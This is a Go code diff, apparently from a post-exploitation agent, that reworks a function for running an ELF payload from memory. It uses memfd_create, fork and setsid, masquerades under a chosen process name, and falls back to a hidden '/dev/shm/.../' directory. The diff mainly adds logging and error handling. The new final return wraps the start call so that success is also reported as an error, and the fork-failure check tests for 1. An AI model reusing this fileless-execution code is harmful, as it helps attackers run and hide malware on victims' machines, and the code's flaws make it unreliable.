@@ -68,7 +68,7 @@ func ProcUID(pid int) string {
 }
 
 // run ELF from memory
-func RunFromMemory(procName string, buffer []byte) (err error) {
+func RunFromMemory(procName, args string, buffer []byte) (err error) {
 	const (
 		mfdCloexec     = 0x0001
 		memfdCreateX64 = 319
@@ -77,11 +77,15 @@ func RunFromMemory(procName string, buffer []byte) (err error) {
 	fdName := "" // *string cannot be initialized
 
 	fd, _, _ := syscall.Syscall(memfdCreateX64, uintptr(unsafe.Pointer(&fdName)), uintptr(mfdCloexec), 0)
-	_, _ = syscall.Write(int(fd), buffer)
+	_, err = syscall.Write(int(fd), buffer)
+	if err != nil {
+		return fmt.Errorf("write: %v", err)
+	}
 
 	fdPath := fmt.Sprintf("/proc/self/fd/%d", fd)
 
-	switch child, _, _ := syscall.Syscall(fork, 0, 0, 0); child {
+	child, _, _ := syscall.Syscall(fork, 0, 0, 0)
+	switch child {
 	case 0:
 		break
 	case 1:
@@ -89,6 +93,7 @@ func RunFromMemory(procName string, buffer []byte) (err error) {
 		return fmt.Errorf("fork failed")
 	default:
 		// Parent exiting...
+		log.Println("Exiting")
 		os.Exit(0)
 	}
 
@@ -96,17 +101,21 @@ func RunFromMemory(procName string, buffer []byte) (err error) {
 	_, _ = syscall.Setsid()
 	_ = syscall.Chdir("/")
 
-	file, _ := os.OpenFile("/dev/null", os.O_RDWR, 0)
+	file, err := os.OpenFile("/dev/null", os.O_RDWR, 0)
+	if err != nil {
+		return fmt.Errorf("open /dev/null: %v", err)
+	}
 	err = syscall.Dup2(int(file.Fd()), int(os.Stdin.Fd()))
 	if err != nil {
-		return
+		return fmt.Errorf("Dup2: %v", err)
 	}
 	file.Close()
 
 	progWithArgs := append([]string{procName}, os.Args[1:]...)
+	log.Printf("Starting memfd executable as %s", procName)
 	err = syscall.Exec(fdPath, progWithArgs, nil)
 	if err == nil {
-		log.Println("agent started from memory using memfd_create")
+		log.Printf("%s started from memory using memfd_create", procName)
 		return
 	}
 
@@ -114,20 +123,23 @@ func RunFromMemory(procName string, buffer []byte) (err error) {
 	log.Printf("memfd_create failed: %v, trying shm_open", err)
 	shmPath := "/dev/shm/.../"
 	if _, err = os.Stat(shmPath); os.IsNotExist(err) {
+		log.Printf("shmPath does not exist, creating it")
 		err = os.Mkdir(shmPath, 0700)
 		if err != nil {
-			return
+			return fmt.Errorf("mkdir shmPath: %v", err)
 		}
 	}
 	err = ioutil.WriteFile(shmPath+procName, buffer, 0755)
 	if err != nil {
-		return
+		return fmt.Errorf("WriteFile to shmPath: %v", err)
 	}
 	err = os.Chdir(shmPath)
 	if err != nil {
-		return
+		return fmt.Errorf("cd to shmPath: %v", err)
 	}
-	cmd := exec.Command(procName, os.Args[1:]...)
+	cmd := exec.Command(procName, strings.Fields(args)...)
 	cmd.Env = os.Environ()
-	return cmd.Start()
+
+	log.Printf("Starting shm executable %s", shmPath+procName)
+	return fmt.Errorf("Start shm executable: %v", cmd.Start())
 }
